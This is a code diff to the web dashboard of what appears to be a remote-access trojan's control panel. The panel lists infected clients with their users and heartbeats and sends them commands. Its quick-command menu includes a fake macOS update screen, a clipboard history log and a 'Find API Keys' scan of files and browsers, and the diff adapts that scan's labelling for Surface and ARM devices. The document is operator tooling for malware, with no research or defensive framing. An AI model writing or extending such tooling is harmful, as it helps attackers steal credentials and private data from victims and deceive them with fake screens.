@@ -243,6 +243,11 @@ DASHBOARD_HTML = """
         th { background: #16213e; }
         .online { color: #4ecca3; }
         .offline { color: #e94560; }
+        .badge { display: inline-block; padding: 2px 8px; border-radius: 4px; font-size: 11px; margin-left: 4px; }
+        .badge-surface { background: #0078d4; color: white; }
+        .badge-tablet { background: #ff6b35; color: white; }
+        .badge-arm { background: #9b59b6; color: white; }
+        .badge-x64 { background: #34495e; color: white; }
         input, button { padding: 8px; margin: 4px; }
         button { background: #e94560; color: white; border: none; cursor: pointer; }
         .log { background: #0f0f23; padding: 10px; font-family: monospace; max-height: 200px; overflow-y: auto; }
@@ -254,6 +259,7 @@ DASHBOARD_HTML = """
         .cmd-btn { background: #16213e; border: 1px solid #333; color: #eee; padding: 12px; text-align: left; cursor: pointer; border-radius: 4px; }
         .cmd-btn:hover { background: #0f3460; }
         .cmd-btn span { display: block; font-size: 11px; color: #888; margin-top: 4px; }
+        .machine-info { font-size: 12px; color: #aaa; }
     </style>
 </head>
 <body>
@@ -275,7 +281,26 @@ DASHBOARD_HTML = """
             <td class="{{ 'online' if s.online else 'offline' }}">
                 {{ 'Online' if s.online else 'Offline' }}
             </td>
-            <td>{{ s.system_info.get('system', 'Unknown') }}</td>
+            <td>
+                {{ s.system_info.get('system', 'Unknown') }}
+                {% if s.system_info.get('machine_type') %}
+                    {% set mt = s.system_info.get('machine_type', '') %}
+                    {% if 'surface' in mt %}
+                        <span class="badge badge-surface">Surface</span>
+                    {% elif 'tablet' in mt %}
+                        <span class="badge badge-tablet">Tablet</span>
+                    {% endif %}
+                {% endif %}
+                {% if s.system_info.get('arch') %}
+                    {% set arch = s.system_info.get('arch', '') %}
+                    {% if 'ARM' in arch %}
+                        <span class="badge badge-arm">{{ arch }}</span>
+                    {% else %}
+                        <span class="badge badge-x64">{{ arch }}</span>
+                    {% endif %}
+                {% endif %}
+                <div class="machine-info">{{ s.system_info.get('model', '') }}</div>
+            </td>
             <td>{{ s.system_info.get('user', 'Unknown') }}</td>
             <td>{{ '%.0f' % (now - s.last_heartbeat) }}s ago</td>
             <td>
@@ -283,7 +308,7 @@ DASHBOARD_HTML = """
                     <input type="hidden" name="player_id" value="{{ sid }}">
                     <input type="text" name="command" placeholder="Command" size="20">
                     <button type="submit">Send</button>
-                    <button type="button" onclick="openModal('{{ sid }}')" style="background:#0f3460;">Quick</button>
+                    <button type="button" onclick="openModal('{{ sid }}', '{{ s.system_info.get('machine_type', 'desktop') }}', '{{ s.system_info.get('arch', 'x64') }}')" style="background:#0f3460;">Quick</button>
                 </form>
             </td>
         </tr>
@@ -311,7 +336,7 @@ DASHBOARD_HTML = """
     <div id="quickModal" class="modal">
     <div class="modal-content">
     <div class="modal-header">
-    <h2>Quick Commands</h2>
+    <h2>Quick Commands <span id="machineBadge" style="font-size:14px;"></span></h2>
     <span class="close-btn" onclick="closeModal()">&times;</span>
     </div>
     <div class="cmd-grid">
@@ -333,15 +358,45 @@ DASHBOARD_HTML = """
     <button class="cmd-btn" style="background:#1a1a1a;border-color:#999;" onclick="sendCmd('APPLE_UPDATE')">🍎 Apple Update <span>Fake macOS updating screen</span></button>
     <button class="cmd-btn" style="background:#0a0a0a;border-color:#f44336;" onclick="sendCmd('HIDE_UPDATE')">❌ Hide Update <span>Close update screen</span></button>
     <button class="cmd-btn" style="background:#1a1a0a;border-color:#ffd700;" onclick="sendCmd('CLIPBOARD_LOG')">📋 Clipboard Log <span>View copied text history</span></button>
-    <button class="cmd-btn" style="background:#0a0a2a;border-color:#ff9800;" onclick="sendCmd('FIND_API_KEYS')">🔑 Find API Keys <span>Search files/browsers for keys</span></button>
+    <button class="cmd-btn" style="background:#0a0a2a;border-color:#ff9800;" id="btnFindApi" onclick="sendCmd('FIND_API_KEYS')">🔑 Find API Keys <span>Search files/browsers for keys</span></button>
     </div>
     </div>
     </div>
 
     <script>
     var activeClientId = '';
-    function openModal(clientId) {
+    var activeMachineType = 'desktop';
+    var activeArch = 'x64';
+    
+    function openModal(clientId, machineType, arch) {
         activeClientId = clientId;
+        activeMachineType = machineType || 'desktop';
+        activeArch = arch || 'x64';
+        
+        var badge = document.getElementById('machineBadge');
+        var badgeText = '';
+        if (activeMachineType.includes('surface')) {
+            badgeText += '📱 Surface ';
+        } else if (activeMachineType.includes('tablet')) {
+            badgeText += '📱 Tablet ';
+        }
+        if (activeArch.includes('ARM')) {
+            badgeText += '⚡ ' + activeArch;
+        }
+        if (badgeText) {
+            badge.innerHTML = '| ' + badgeText;
+        } else {
+            badge.innerHTML = '';
+        }
+        
+        /* Adjust API key button text for Surface/ARM */
+        var apiBtn = document.getElementById('btnFindApi');
+        if (activeMachineType.includes('surface') || activeArch.includes('ARM')) {
+            apiBtn.innerHTML = '🔑 Find API Keys <span>Surface/ARM adaptive scan</span>';
+        } else {
+            apiBtn.innerHTML = '🔑 Find API Keys <span>Search files/browsers for keys</span>';
+        }
+        
         document.getElementById('quickModal').style.display = 'block';
     }
     function closeModal() {
